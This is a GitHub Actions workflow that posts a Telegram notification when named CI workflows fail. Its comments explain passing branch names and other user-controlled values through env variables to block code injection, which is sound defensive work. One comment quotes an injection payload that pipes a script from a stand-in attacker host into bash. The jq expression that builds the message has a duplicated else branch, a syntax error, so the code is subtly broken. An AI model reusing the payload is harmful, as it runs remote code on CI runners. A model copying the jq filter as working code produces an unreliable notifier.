# PR-15 (T7): Telegram notifications на CI failures.
#
# Отправляет сообщение в Telegram чат/канал когда CI workflow завершается с failure.
# Требует 3 secrets в GitHub repo settings:
#   - TELEGRAM_BOT_TOKEN  (токен от @BotFather, команда /token)
#   - TELEGRAM_CHAT_ID    (ID чата/канала; @userinfobot для получения)
#   - Опционально: TELEGRAM_THREAD_ID (для топика в супергруппе)
#
# Setup guide: docs/TELEGRAM_SETUP.md

name: Notify Telegram (CI failures)

on:
  workflow_run:
    workflows:
      - "CI"
      - "Docker"
      - "SBOM (CycloneDX)"
    types:
      - completed

permissions:
  contents: read
  actions: read

jobs:
  notify:
    name: Notify on failure
    runs-on: ubuntu-latest
    if: >-
      github.event.workflow_run.conclusion == 'failure' &&
      github.event.workflow_run.event != 'pull_request'
    steps:
      - name: Get failure details
        id: details
        env:
          # Security (CodeQL actions/code-injection fix): user-controlled inputs
          # (workflow_run.name, head_branch, head_sha, actor.login) передаются через
          # env, а не через прямую интерполяцию ${{ }} в run: блок. Это предотвращает
          # code injection через имя branch (e.g. `"; curl evil.com | bash; #`).
          WORKFLOW: ${{ github.event.workflow_run.name }}
          RUN_ID: ${{ github.event.workflow_run.id }}
          CONCL: ${{ github.event.workflow_run.conclusion }}
          HEAD: ${{ github.event.workflow_run.head_branch }}
          SHA: ${{ github.event.workflow_run.head_sha }}
          ACTOR: ${{ github.event.workflow_run.actor.login }}
          HTML_URL: ${{ github.event.workflow_run.html_url }}
        run: |
          {
            echo "WORKFLOW=${WORKFLOW}"
            echo "HEAD=${HEAD}"
            echo "SHA=${SHA:0:8}"
            echo "ACTOR=${ACTOR}"
            echo "HTML_URL=${HTML_URL}"
          } >> "$GITHUB_OUTPUT"

      - name: Send Telegram notification
        if: env.TELEGRAM_BOT_TOKEN != '' && env.TELEGRAM_CHAT_ID != ''
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          TELEGRAM_THREAD_ID: ${{ secrets.TELEGRAM_THREAD_ID }}
          # Security (CodeQL actions/code-injection fix): user-controlled inputs
          # из предыдущего step передаются через env, а не через прямую
          # интерполяцию ${{ steps.details.outputs.* }} в run: блок.
          WORKFLOW: ${{ steps.details.outputs.WORKFLOW }}
          HEAD: ${{ steps.details.outputs.HEAD }}
          SHA: ${{ steps.details.outputs.SHA }}
          ACTOR: ${{ steps.details.outputs.ACTOR }}
          HTML_URL: ${{ steps.details.outputs.HTML_URL }}
        run: |
          # Пропускаем если TELEGRAM_BOT_TOKEN не настроен (graceful degradation).
          if [ -z "$TELEGRAM_BOT_TOKEN" ]; then
            echo "ℹ TELEGRAM_BOT_TOKEN not set — notifications disabled"
            exit 0
          fi

          # Markdown message (< 4096 chars).
          TEXT="❌ *CI failed*\n\n*Workflow:* \`${WORKFLOW}\`\n*Branch:* \`${HEAD}\`\n*Commit:* \`${SHA}\`\n*Triggered by:* ${ACTOR}\n\n[View run](${HTML_URL})"

          curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -H "Content-Type: application/json" \
            -d "$(jq -n \
              --arg chat_id "$TELEGRAM_CHAT_ID" \
              --arg text "$TEXT" \
              --arg parse_mode 'Markdown' \
              --arg message_thread_id "${TELEGRAM_THREAD_ID:-}" \
              '{chat_id: $chat_id, text: $text, parse_mode: $parse_mode}
              + (if $message_thread_id != "" then {message_thread_id: ($message_thread_id | fromjson)} else {} else {} end)')" \
            > /tmp/telegram-resp.json

          # Если Telegram API вернул ok=false, log error (но не fail job — это best-effort).
          if ! jq -e '.ok == true' /tmp/telegram-resp.json >/dev/null 2>&1; then
            echo "::warning::Telegram API error: $(cat /tmp/telegram-resp.json)"
          fi